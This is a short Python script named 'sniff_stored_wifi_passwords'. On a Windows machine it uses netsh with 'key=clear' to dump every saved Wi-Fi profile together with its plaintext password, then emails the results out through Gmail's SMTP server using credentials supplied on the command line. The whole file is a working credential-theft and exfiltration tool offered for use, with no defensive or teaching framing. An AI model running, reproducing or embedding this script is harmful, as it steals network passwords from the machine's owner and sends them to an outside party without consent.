#!/usr/bin/env python
import optparse
import subprocess
import smtplib
import re


def getInput():
    parser = optparse.OptionParser(usage="Usage: sniff_stored_wifi_passwords [-e] [email] [-p] [password]\nUsage "
                                         "Example:\t "
                                         "sniff_stored_wifi_passwords -e email@gmail.com -p Password12")
    parser.add_option("-e", "--email", dest="email", help="Specify email")
    parser.add_option("-p", "--password", dest="pwd", help="Specify Password")
    options = parser.parse_args()[0]
    return options


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def main():
    options = getInput()
    if not options.email:
        print("[-] specify email")
    elif not options.pwd:
        print("[-] specify password")
    else:
        command = "sc query \"wlansvc\" "
        wlan_status = subprocess.check_output(command, shell=True)
        if "RUNNING" in wlan_status:
            command = "netsh wlan show profile"
            networks = subprocess.check_output(command, shell=True)
            network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
            if network_names_list:
                result = ""
                for network in network_names_list:
                    command = "netsh wlan show profile " + "\"" + network + "\"" + "key=clear"
                    current_result = subprocess.check_output(command, shell=True)
                    result += current_result

                send_mail(options.email, options.pwd, result)
            else:
                print("No Profile Exists")
        else:
            print("wlansvc is not running")


main()
